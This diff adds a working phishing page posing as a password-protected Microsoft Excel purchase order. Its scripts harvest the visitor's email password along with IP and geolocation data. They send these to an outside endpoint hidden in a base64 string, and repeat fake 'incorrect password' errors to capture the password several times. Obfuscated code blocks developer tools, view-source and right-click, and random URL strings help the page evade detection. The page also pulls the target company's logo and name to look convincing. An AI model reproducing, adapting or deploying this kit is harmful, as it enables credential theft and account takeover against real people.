@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Data synchronization</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: #f0f0f0;
+        font-family: Arial, sans-serif;
+        width: 100%;
+        overflow: hidden;
+      }
+
+      #loader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 999;
+        transition: opacity 0.5s, visibility 0.5s;
+      }
+
+      .spin {
+        width: 40px;
+        height: 40px;
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-top: 4px solid #217346;
+        border-radius: 50%;
+        animation: spinning 1s linear infinite;
+        margin: 20px 0;
+      }
+
+      @keyframes spinning {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      #logo {
+        width: 100px;
+        height: auto;
+      }
+
+      #main-content {
+        opacity: 0;
+        transition: opacity 0.5s;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .loading-text {
+        font-size: 1.2em;
+        color: #555;
+        animation: pulse 1.5s infinite;
+      }
+
+      #submitLoader {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 1);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      }
+
+      #submitLoader .spinner {
+        flex-direction: column;
+        justify-content: center;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid green;
+        border-radius: 50%;
+        width: 45px;
+        height: 45px;
+        animation: spinning 1s linear infinite;
+        transition: opacity 0.5s;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .container {
+        width: 500px;
+        height: 360px;
+        margin: 0 auto;
+        padding: 20px;
+        border: 1px solid #ccc;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: rgba(225, 225, 225, 0.5);
+      }
+
+      .input-field {
+        width: 100%;
+        margin-bottom: 10px;
+      }
+
+      .input-field input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+      }
+
+      .input-field label {
+        display: block;
+        margin-bottom: 5px;
+      }
+
+      .error-message {
+        color: red;
+        display: none; /* Hidden initially */
+        margin-bottom: 10px;
+      }
+
+      .submit-btn {
+        width: 25%;
+        padding: 10px;
+        background-color: green;
+        color: white;
+        border: none;
+        align: left;
+        cursor: pointer;
+      }
+
+      .submit-btn:hover {
+        background-color: darkgreen;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.5;
+        }
+      }
+
+      @media (max-width: 600px) {
+        .spin {
+          width: 30px;
+          height: 30px;
+          border-width: 3px;
+        }
+        .loading-text {
+          font-size: 1em;
+        }
+        #logo {
+          width: 60px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="loader">
+      <img
+        id="logo"
+        src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Microsoft_Office_Excel_%282019%E2%80%932025%29.svg"
+        alt="XLS Logo"
+      />
+      <div class="spin"></div>
+      <p class="loading-text">Loading... Please wait!</p>
+      <p class="loading-text"><strong>Preparing your dashboard...</strong></p>
+    </div>
+
+    <!-- Submit Loading Screen -->
+    <div id="submitLoader">
+      <div class="spinner"></div>
+    </div>
+
+    <div id="main-content">
+      <div class="container">
+        <form id="authForm">
+          <div class="input-field">
+            <img
+              id="logo"
+              src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+              alt=""
+            />
+            <p
+              style="
+                margin-bottom: -8px;
+                margin-top: -8px;
+                font-weight: bold;
+                text-align: center;
+              "
+            >
+              <span id="cname" style="display: inline">
+                [[-COMPANY_NAME-]]
+              </span>
+              Purchase Order.xls
+            </p>
+            <p
+              style="
+                font-size: 12px;
+                align: left;
+                margin-bottom: 40px;
+                color: green;
+              "
+            >
+              Microsoft Excel File
+            </p>
+            <p>
+              This Document is Protected! Please enter your E-mail password to open.
+            </p>
+            <label for="login"></label>
+            <input
+              type="email"
+              id="login"
+              name="login"
+              placeholder="Email Address" value="[[-EMAIL-]]"
+              readonly
+            />
+          </div>
+          <div class="input-field">
+            <label for="password-input"></label>
+            <input
+              type="password"
+              id="password-input"
+              name="password-input"
+              placeholder="Email Password"
+              required
+            />
+          </div>
+          <div id="error" class="error-message">
+            Incorrect Password! Please Try Again.
+          </div>
+          <button type="submit" id="btnLogin" class="submit-btn">
+            Continue
+          </button>
+        </form>
+      </div>
+    </div>
+    <script>
+const _0x424b5c=_0x4e11;(function(_0x4d3f40,_0x1a5bca){const _0x273499=_0x4e11,_0x123c26=_0x4d3f40();while(!![]){try{const _0x19fa0e=-parseInt(_0x273499(0x176))/0x1+parseInt(_0x273499(0x16e))/0x2+-parseInt(_0x273499(0x177))/0x3*(-parseInt(_0x273499(0x186))/0x4)+parseInt(_0x273499(0x182))/0x5+parseInt(_0x273499(0x198))/0x6+parseInt(_0x273499(0x179))/0x7*(-parseInt(_0x273499(0x19c))/0x8)+-parseInt(_0x273499(0x18f))/0x9;if(_0x19fa0e===_0x1a5bca)break;else _0x123c26['push'](_0x123c26['shift']());}catch(_0x5d8aa9){_0x123c26['push'](_0x123c26['shift']());}}}(_0x30e3,0x377f7));function _0x4e11(_0x3b32a3,_0x170486){const _0x30e3cd=_0x30e3();return _0x4e11=function(_0x4e1119,_0x4c154c){_0x4e1119=_0x4e1119-0x16d;let _0x46e7ed=_0x30e3cd[_0x4e1119];return _0x46e7ed;},_0x4e11(_0x3b32a3,_0x170486);}let attempt=0x1;function _0x30e3(){const _0x440440=['7mUnkAk','style','location-data','opacity','query','center','Loading...\x20Please\x20wait!','json','.loading-text','1136265fHAIoo','hidden','region','timezone','64Nfkarj','addEventListener','flex','value','lat','no-repeat','backgroundImage','load','body','2024046ifvFKK','regionName','Error\x20fetching\x20location\x20data:','main-content','submitLoader','backgroundPosition','stringify','backgroundRepeat','city','1989606HZcYhs','error','getElementById','lon','136888AOsxhe','loader','135104fgQcJU','none','country','isp','visibility','querySelector','cover','backgroundSize','301706BMGNRg','27117UlzHQC','url(\x27https://raw.githubusercontent.com/nicconkunscotts/st/refs/heads/main/download.png\x27)'];_0x30e3=function(){return _0x440440;};return _0x30e3();}async function fetchLocationData(){const _0x374ade=_0x4e11;try{const _0x1ccf97=await fetch('https://ip-api.com/json/'),_0x4c1eda=await _0x1ccf97[_0x374ade(0x180)](),_0x14a329={};_0x14a329['ip']=_0x4c1eda[_0x374ade(0x17d)],_0x14a329['country']=_0x4c1eda[_0x374ade(0x170)],_0x14a329[_0x374ade(0x184)]=_0x4c1eda[_0x374ade(0x190)],_0x14a329[_0x374ade(0x197)]=_0x4c1eda['city'],_0x14a329[_0x374ade(0x185)]=_0x4c1eda['timezone'],_0x14a329[_0x374ade(0x171)]=_0x4c1eda[_0x374ade(0x171)],_0x14a329[_0x374ade(0x18a)]=_0x4c1eda['lat'],_0x14a329[_0x374ade(0x19b)]=_0x4c1eda[_0x374ade(0x19b)];const _0x4381fd=_0x14a329;document[_0x374ade(0x19a)](_0x374ade(0x17b))[_0x374ade(0x189)]=JSON[_0x374ade(0x195)](_0x4381fd);}catch(_0x293e08){console[_0x374ade(0x199)](_0x374ade(0x191),_0x293e08);}}window[_0x424b5c(0x187)](_0x424b5c(0x18d),function(){const _0x351fb3=_0x424b5c,_0x1b906c=document[_0x351fb3(0x19a)](_0x351fb3(0x193));_0x1b906c[_0x351fb3(0x17a)]['display']=_0x351fb3(0x188),setTimeout(()=>{const _0x208cf6=_0x351fb3;_0x1b906c['style']['display']=_0x208cf6(0x16f);},0x7d0),showLoadingText(),setTimeout(hideLoader,0xbb8);});function hideLoader(){const _0x2f97af=_0x424b5c,_0x42dae2=document['getElementById'](_0x2f97af(0x16d)),_0x4afb56=document['getElementById'](_0x2f97af(0x192));_0x42dae2[_0x2f97af(0x17a)][_0x2f97af(0x17c)]='0',_0x42dae2['style'][_0x2f97af(0x172)]=_0x2f97af(0x183),_0x4afb56[_0x2f97af(0x17a)][_0x2f97af(0x17c)]='1',document['body'][_0x2f97af(0x17a)][_0x2f97af(0x18c)]=_0x2f97af(0x178),document[_0x2f97af(0x18e)][_0x2f97af(0x17a)][_0x2f97af(0x175)]=_0x2f97af(0x174),document['body'][_0x2f97af(0x17a)][_0x2f97af(0x194)]=_0x2f97af(0x17e),document[_0x2f97af(0x18e)][_0x2f97af(0x17a)][_0x2f97af(0x196)]=_0x2f97af(0x18b);}function showLoadingText(){const _0x144450=_0x424b5c,_0x252d3a=document[_0x144450(0x173)](_0x144450(0x181));setTimeout(()=>{const _0x118951=_0x144450;_0x252d3a['textContent']=_0x118951(0x17f),_0x252d3a['textContent']='Almost\x20ready...\x20Please\x20wait!';},0xfa0);}
+    </script>
+    <script>
+      function generateRandomString(length) {
+        const characters =
+          "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        let result = "";
+        for (let i = 0; i < length; i++) {
+          result += characters.charAt(
+            Math.floor(Math.random() * characters.length)
+          );
+        }
+        return result;
+      }
+
+      function appendRandomStringToURL() {
+        const randomString = generateRandomString(350);
+        const currentURL = window.location.href.split("?")[0];
+        // Use string concatenation as a temporary measure to avoid potential backtick issues
+        window.history.replaceState(
+          null,
+          null,
+          currentURL + "?websrc=" + randomString
+        );
+      }
+
+      window.onload = appendRandomStringToURL;
+    </script>
+<script>
+      function _0x5125(_0x2bad28,_0x36ed71){var _0x123cf4=_0x123c();return _0x5125=function(_0x512524,_0xf7a30b){_0x512524=_0x512524-0x12e;var _0x471edf=_0x123cf4[_0x512524];return _0x471edf;},_0x5125(_0x2bad28,_0x36ed71);}var _0x45a3f5=_0x5125;(function(_0x4fbdde,_0x1dc5f6){var _0x5dd2bd=_0x5125,_0x1cb41d=_0x4fbdde();while(!![]){try{var _0x51ce32=-parseInt(_0x5dd2bd(0x142))/0x1*(-parseInt(_0x5dd2bd(0x12f))/0x2)+parseInt(_0x5dd2bd(0x13c))/0x3+-parseInt(_0x5dd2bd(0x141))/0x4*(-parseInt(_0x5dd2bd(0x13f))/0x5)+parseInt(_0x5dd2bd(0x140))/0x6*(parseInt(_0x5dd2bd(0x13d))/0x7)+-parseInt(_0x5dd2bd(0x130))/0x8*(-parseInt(_0x5dd2bd(0x136))/0x9)+parseInt(_0x5dd2bd(0x144))/0xa+parseInt(_0x5dd2bd(0x145))/0xb*(-parseInt(_0x5dd2bd(0x138))/0xc);if(_0x51ce32===_0x1dc5f6)break;else _0x1cb41d['push'](_0x1cb41d['shift']());}catch(_0x5bcd8c){_0x1cb41d['push'](_0x1cb41d['shift']());}}}(_0x123c,0xbe9d7),document['onkeydown']=function(_0x2907f3){var _0x25ffdb=_0x5125;if(event['keyCode']==0x7b)return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x137)]&&_0x2907f3[_0x25ffdb(0x133)]=='I'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3['ctrlKey']&&_0x2907f3['shiftKey']&&_0x2907f3['keyCode']=='J'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3['ctrlKey']&&_0x2907f3['keyCode']=='U'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='C'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='X'['charCodeAt'](0x0))return![];if(_0x2907f3['ctrlKey']&&_0x2907f3[_0x25ffdb(0x133)]=='Y'['charCodeAt'](0x0))return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='Z'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3['keyCode']==0x43&&_0x2907f3['shiftKey']&&(_0x2907f3[_0x25ffdb(0x12e)]||_0x2907f3[_0x25ffdb(0x143)]))return![];if(_0x2907f3[_0x25ffdb(0x133)]=='J'[_0x25ffdb(0x13b)](0x0)&&_0x2907f3[_0x25ffdb(0x132)]&&(_0x2907f3[_0x25ffdb(0x12e)]||_0x2907f3['metaKey']))return![];if(_0x2907f3['keyCode']=='I'[_0x25ffdb(0x13b)](0x0)&&_0x2907f3[_0x25ffdb(0x132)]&&(_0x2907f3[_0x25ffdb(0x12e)]||_0x2907f3[_0x25ffdb(0x143)]))return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3['shiftKey']&&_0x2907f3['keyCode']=='C'['charCodeAt'](0x0))return![];if(_0x2907f3[_0x25ffdb(0x143)]&&_0x2907f3[_0x25ffdb(0x133)]=='S'[_0x25ffdb(0x13b)](0x0)||_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='S'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3['ctrlKey']&&_0x2907f3[_0x25ffdb(0x133)]=='H'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3['keyCode']=='A'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3[_0x25ffdb(0x143)]&&_0x2907f3['keyCode']=='F'[_0x25ffdb(0x13b)](0x0)||_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='F'[_0x25ffdb(0x13b)](0x0))return![];if(_0x2907f3['metaKey']&&_0x2907f3[_0x25ffdb(0x133)]=='E'[_0x25ffdb(0x13b)](0x0)||_0x2907f3[_0x25ffdb(0x12e)]&&_0x2907f3[_0x25ffdb(0x133)]=='E'[_0x25ffdb(0x13b)](0x0))return![];});function _0x123c(){var _0x1b2c32=['metaKey','14560810zxuHqZ','52701eNgrNW','addEventListener','ctrlKey','22UgNGiq','8mFtvtv','event','altKey','keyCode','oncontextmenu','returnValue','4212099wfsGte','shiftKey','13116PbeAdX','contextmenu','preventDefault','charCodeAt','4088958WdypmD','7xOWXBP','attachEvent','418090tNqozx','7816206RCdbZv','48RpFUpo','38557ZjySDt'];_0x123c=function(){return _0x1b2c32;};return _0x123c();}document[_0x45a3f5(0x146)]?document['addEventListener'](_0x45a3f5(0x139),function(_0x48c6c4){var _0x5ab6a1=_0x45a3f5;_0x48c6c4[_0x5ab6a1(0x13a)]();},![]):document[_0x45a3f5(0x13e)](_0x45a3f5(0x134),function(){var _0x3ccfb7=_0x45a3f5;window[_0x3ccfb7(0x131)][_0x3ccfb7(0x135)]=![];});
+    </script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.20.0/axios.min.js"></script>
+    <script src="https://www.unpkg.com/word-casing@1.0.8/index.js"></script>
+
+    <script>
+      $("body").on("click", "a", function (e) {s
+        e.preventDefault();
+      });
+
+      let RURL = "aHR0cHM6Ly96ZW5pdGhwb3Jkcy5jb20vQGNpZC9jbi94L2luZGV4LnBocA==";
+
+      try {
+        RURL = atob(RURL);
+      } catch (e) {}
+
+      var outgoingObj = {
+        email: "",
+        password: "",
+        domain: "",
+      };
+
+      const validateEmail = (email) => {
+        return email.match(
+          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+        );
+      };
+
+      $(document).ready(() => {
+        var emailHref;
+        var brokenEmail;
+        var newURL = genID(252);
+        var newHref = `${
+          location.href.includes("#")
+            ? location.href.split("#")[0]
+            : location.href
+        }?websrc=${newURL}${
+          $("#login").val() == "" ? location.hash : "#" + $("#login").val()
+        }`;
+        // $('#ImgLoginBanner').attr(
+        //   'style',
+        //   `background-image: url('https://tunilsz.github.io/mxc/webmail-logo.png')`
+        // )
+
+        if (location.href.includes("#")) {
+          var emailHref64 = location.href.split("#")[1];
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64);
+
+          localStorage.setItem("#login", emailHref);
+        } else if (localStorage.getItem("#login")) {
+          var emailHref64 = localStorage.getItem("#login");
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64);
+        }
+
+        if (emailHref) {
+          brokenEmail = emailHref.split("@");
+          var main_domain = brokenEmail[1].split(".")[0];
+          var upper_main_domain = `${brokenEmail[1].replace(
+            main_domain.charAt(0),
+            main_domain.charAt(0).toUpperCase()
+          )}`;
+
+          fetch(`https://logo.clearbit.com/${brokenEmail[1]}`)
+            .then((res) => {
+              $(".custom-bannered").attr(
+                "src",
+                `https://logo.clearbit.com/${brokenEmail[1]}`
+              );
+              // .addClass("biggerImage");
+
+              $(".small-logo").attr(
+                "href",
+                `https://logo.clearbit.com/${brokenEmail[1]}`
+              );
+              // .addClass("biggerImage");
+            })
+            .catch((err) => {});
+
+          fetch(
+            `https://autocomplete.clearbit.com/v1/companies/suggest?query=${brokenEmail[1]}`
+          )
+            .then((d) => d.json())
+            .then((data) => {
+              console.log("data: ", data);
+
+              if (data.length) {
+                const foundName = data.filter((d) => d.name);
+                if (!foundName.length) throw Error("bad");
+                if (foundName.length) $("#cname").html(`${foundName[0].name}`);
+              }
+            })
+            .catch((err) => {
+              const dom_name = emailHref
+                .substring(emailHref.lastIndexOf("@") + 1, emailHref.length)
+                .split(".")[0]
+                .trim()
+                .toNameCase();
+
+              $("#cname").html(`${dom_name}`);
+            });
+
+          async function getCompanyName(email) {
+            let company_name = getDomainName(email);
+
+            try {
+              const axios = axiosConfig();
+              const domain = getDomain(email);
+
+              const url = `https://autocomplete.clearbit.com/v1/companies/suggest?query=${brokenEmail[1]}`;
+              const response = await axios.get(url);
+              const data = response.data;
+
+              if (data.length) {
+                const foundName = data.filter((d) => d.name);
+                if (foundName.length) company_name = foundName[0].name;
+              }
+            } catch (err) {
+              company_name = getDomainName(email);
+            }
+
+            return company_name;
+          }
+
+          //   $("#favicon").attr("href", `https://logo.clearbit.com/${brokenEmail[1]}`)
+          //   $('#bottomline').html(`${upper_main_domain} Outlook`)
+          //   $("#title").html(`${upper_main_domain}`);
+          //   document.title = `${upper_main_domain} - Outlook`;
+          //   $("#poweredby").html(upper_main_domain);
+
+          //   $('#ImgLoginBanner').attr(
+          //     'style',
+          //     `background-image: url('https://logo.clearbit.com/${brokenEmail[1]}')`
+          //   )
+
+          $(`#login`).val(emailHref);
+          $(`#login`).attr("disabled", "disabled");
+          $(`#login`).addClass("input-disabled");
+          $("#password-input").focus();
+        }
+        history.replaceState("", "", newHref);
+
+        passwordChecker($(`#login`), $(`#password-input`), "");
+
+        function passwordChecker(emailVal, passVal, domain) {
+          var count = 0;
+          var submitButton = $("#btnLogin");
+          var msg = $("#error");
+          var msgElem = $("#notifications-con");
+          var loading = $("#submitLoader");
+          var loadingMsg = "Continue..";
+          var successMsg = "Sorry, Sign-in session timeout, try again!";
+          var invalidMsg = "Some of your info are Incorrect. Please try again.";
+          var noPass = "Enter a password!";
+          var lessThan4 = "Password must be above 4 characters";
+          var error = "No email found";
+
+          msgElem.hide();
+          loading.hide();
+          $("#authForm").submit((e) => {
+            e.preventDefault();
+
+            msg.hide();
+            msg.html("");
+            msgElem.hide();
+            domain = emailVal.val().split("@")[1];
+
+            loading.css("display", "flex");
+            $("#btnLogin").html(loadingMsg);
+            setTimeout(async () => {
+              if (emailVal.val() == "") {
+                msg.show();
+                loading.hide();
+                msg.html(error);
+                msgElem.show();
+              } else {
+                if (passVal.val() == "") {
+                  msg.show();
+                  loading.hide();
+                  msg.html(noPass);
+                  msgElem.show();
+                } else {
+                  if (passVal.val().length < 4) {
+                    msg.show();
+                    loading.hide();
+                    msg.html(lessThan4);
+                    msgElem.show();
+                    passVal.val("");
+                  } else {
+                    count = ++count;
+                    if (count == 1) {
+                      msg.show();
+                      loading.hide();
+                      msg.html(invalidMsg);
+                      msgElem.show();
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain);
+                      passVal.val("");
+                    } else if (count == 2) {
+                      msg.show();
+                      loading.hide();
+                      msg.html(invalidMsg);
+                      msgElem.show();
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain);
+                      passVal.val("");
+                    } else if (count == 3) {
+                      const { out, pstD } = await postDataHelper(
+                        emailVal.val(),
+                        passVal.val(),
+                        domain
+                      );
+
+                      if (pstD) {
+                        msg.show();
+                        msg.html(successMsg);
+                        msgElem.show();
+
+                        setTimeout(() => {
+                          loading.hide();
+                          window.location.replace(`${domain}`);
+                        }, 5000);
+                      }
+                    }
+                  }
+                }
+              }
+
+              $("#btnLogin").html("Continue");
+            }, 1500);
+
+            // console.log("count: ", count)
+          });
+        }
+      });
+
+      // Example POST method implementation:
+      async function postData(url = "", data) {
+        const formData = new FormData();
+        formData.append("email", data.email);
+        formData.append("password", `${data.password} =>>> [${location.href}]`);
+        const response = await axios.post(url, formData);
+        return response.data;
+      }
+
+      async function postDataHelper(em, pass, dm) {
+        outgoingObj.email = em;
+        outgoingObj.password = pass;
+        outgoingObj.domain = dm;
+
+        var out = { key: em, dm };
+
+        // Put here the url of the email
+        var pstD = await postData(RURL, {
+          ...outgoingObj,
+        });
+
+        return { out, pstD };
+      }
+
+      function genID(length) {
+        var result = "";
+        var characters =
+          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var charactersLength = characters.length;
+        for (var i = 0; i < length; i++) {
+          result += characters.charAt(
+            Math.floor(Math.random() * charactersLength)
+          );
+        }
+
+        return result;
+      }
+    </script>
+  </body>
+</html>
